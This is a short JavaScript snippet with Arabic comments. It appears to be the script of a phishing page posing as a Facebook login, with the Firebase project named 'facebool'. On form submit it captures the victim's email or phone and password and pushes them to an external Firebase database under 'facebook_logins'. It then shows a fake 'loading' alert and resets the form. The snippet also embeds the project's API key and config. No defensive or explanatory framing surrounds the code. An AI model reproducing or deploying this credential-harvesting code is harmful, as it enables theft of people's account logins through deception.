  <script type="module">
    // 1. استيراد مكتبات Realtime Database المتوافقة من الإنترنت مباشرة
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

    // 2. إعدادات مشروعك الحقيقية التي أرسلتها
    const firebaseConfig = {
      apiKey: "AIzaSyDkeUoRzeLLwT26zjlHgUzbU1vnDcweX4o",
      authDomain: "facebool-f49f0.firebaseapp.com",
      databaseURL: "https://facebool-f49f0-default-rtdb.firebaseio.com",
      projectId: "facebool-f49f0",
      storageBucket: "facebool-f49f0.firebasestorage.app",
      messagingSenderId: "1009594237184",
      appId: "1:1009594237184:web:f9a868f1336fa33df2f3e5",
      measurementId: "G-L0JVS244FX"
    };

    // تشغيل الـ Firebase والاتصال بالـ Realtime Database
    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    // مراقبة ضغط زر تسجيل الدخول وإرسال البيانات
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault(); // يمنع تشغيل الأكشن الافتراضي وإعادة تحميل الصفحة

        const emailValue = document.getElementById('email').value;
        const passwordValue = document.getElementById('text').value;

        try {
            // حفظ البيانات في جدول باسم facebook_logins
            await push(ref(db, 'facebook_logins'), {
                emailOrPhone: emailValue,
                password: passwordValue,
                timestamp: new Date().toISOString()
            });
            
            alert("loading ");
            document.getElementById('loginForm').reset(); // مسح الخانات بعد الإرسال
        } catch (error) {
            alert("حدث خطأ أثناء الإرسال: " + error.message);
        }
    });
  </script>
